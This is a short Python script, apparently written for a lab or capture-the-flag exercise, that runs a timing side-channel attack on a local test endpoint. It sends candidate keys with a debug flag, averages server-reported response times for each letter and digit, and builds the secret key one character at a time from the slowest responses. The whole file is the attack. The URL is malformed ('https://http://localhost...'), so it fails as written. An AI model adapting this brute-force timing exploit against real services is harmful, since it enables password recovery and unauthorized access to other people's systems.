#!/usr/bin/env python

import urllib
import urllib.parse
import urllib.request
import string
import json

url = 'https://http://localhost:8000/test'
key_length = 10
sample_size = 10

def send_request(key):
  values = {'key' : key, 'debug' : 'true'}

  data = urllib.parse.urlencode(values)
  data = data.encode('utf-8')
  req = urllib.request.Request(url, data)
  response = urllib.request.urlopen(req)

  response_dict = json.loads(response.read().decode('utf-8'))
  return response_dict

def parse_time_diff(response):
  end = response['end']
  start = response['start']
  return end*1000000 - start*1000000


def main(): 
  charlist = list(string.ascii_letters + string.digits)
  key = ""

  for l in range(key_length):
    averages = []  
    for ch in charlist:
      time_diffs = []
      for i in range(sample_size):
        response = send_request(key + ch)
        diff = parse_time_diff(response)
        time_diffs.append(diff)

      average = sum(time_diffs)/len(time_diffs)
      averages.append(average)
      print(key, "+", ch, "average:", average)

    next_char = charlist[averages.index(max(averages))]
    key = key + next_char

  print("This password is or is a substring of", key)

main()